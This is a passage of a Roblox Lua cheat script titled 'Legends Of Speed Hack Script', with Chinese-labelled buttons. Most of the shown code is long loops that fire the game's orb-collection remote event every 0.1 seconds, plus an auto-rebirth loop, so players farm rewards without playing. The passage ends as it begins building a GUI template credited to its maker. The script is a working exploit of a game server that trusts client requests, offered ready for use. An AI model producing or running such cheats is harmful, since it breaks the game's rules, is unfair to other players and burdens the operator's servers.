game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3)
end

while wait(0.1) do
local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3)
end

while wait(0.1) do
local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3)
end

while wait(0.1) do
local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3)
end

while wait(0.1) do
local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Gem" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Orange Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Blue Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3)
end
end)

AutoRebirth.Name = "繁星中心"
AutoRebirth.Parent = Main
AutoRebirth.BackgroundColor3 = Color3.new(0, 0, 0)
AutoRebirth.Position = UDim2.new(0.225957587, 0, 0.586643875, 0)
AutoRebirth.Size = UDim2.new(0, 200, 0, 50)
AutoRebirth.Font = Enum.Font.GothamSemibold
AutoRebirth.Text = "繁星刷级"
AutoRebirth.TextColor3 = Color3.new(1, 1, 1)
AutoRebirth.TextScaled = true
AutoRebirth.TextSize = 24
AutoRebirth.TextWrapped = true
AutoRebirth.MouseButton1Down:connect(function()
while wait(0.1) do 
local A_1 = "rebirthRequest"
local Event = game:GetService("ReplicatedStorage").rEvents.rebirthEvent
Event:FireServer(A_1)
end
end)

Credits.Name = "Credits"
Credits.Parent = Main
Credits.BackgroundColor3 = Color3.new(0, 0, 0)
Credits.Size = UDim2.new(0, 395, 0, 37)
Credits.Font = Enum.Font.GothamSemibold
Credits.Text = "繁星"
Credits.TextColor3 = Color3.new(1, 1, 1)
Credits.TextScaled = true
Credits.TextSize = 14
Credits.TextWrapped = true

Game.Name = "Game"
Game.Parent = Main
Game.BackgroundColor3 = Color3.new(0, 0, 0)
Game.Position = UDim2.new(0, 0, 0.863468647, 0)
Game.Size = UDim2.new(0, 395, 0, 37)
Game.Font = Enum.Font.GothamSemibold
Game.Text = "Legends Of Speed Hack Script"
Game.TextColor3 = Color3.new(1, 1, 1)
Game.TextScaled = true
Game.TextSize = 14
Game.TextWrapped = true
-- Scripts:
end)

local creds = window:Tab("兵工厂/范围）",'6035145364')

local tool = creds:section("功能",true)
tool:Button("（快捷）",function()
        	-- Template is made by $Krew AKA @e.#3642
-- join my discord: https://discord.gg/JPTv7JkG8g
-- dont change the above!!

local KrewTemplate = Instance.new("ScreenGui")
local KrewTempOpen = Instance.new("Frame")
local Name = Instance.new("TextLabel")
local Line = Instance.new("TextLabel")
local ScrollingFrame = Instance.new("ScrollingFrame")
local UICorner = Instance.new("UICorner")
local Function1 = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local Function2 = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local Function3 = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local Function4 = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local Function5 = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local Function6 = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local Function7 = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local Function8 = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")
local Function9 = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local Function10 = Instance.new("TextButton")
local UICorner_11 = Instance.new("UICorner")
local CredsDontRemove = Instance.new("TextLabel")
local Close = Instance.new("TextButton")
local TempByKrew = Instance.new("Frame")
local TextButton = Instance.new("TextButton")

KrewTemplate.Name = "$KrewTemplate"
KrewTemplate.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
KrewTemplate.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

KrewTempOpen.Name = "$KrewTempOpen"
KrewTempOpen.Parent = KrewTemplate
KrewTempOpen.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
KrewTempOpen.BorderColor3 = Color3.fromRGB(60, 60, 60)
KrewTempOpen.Position = UDim2.new(0.248681813, 0, 0.245463297, 0)
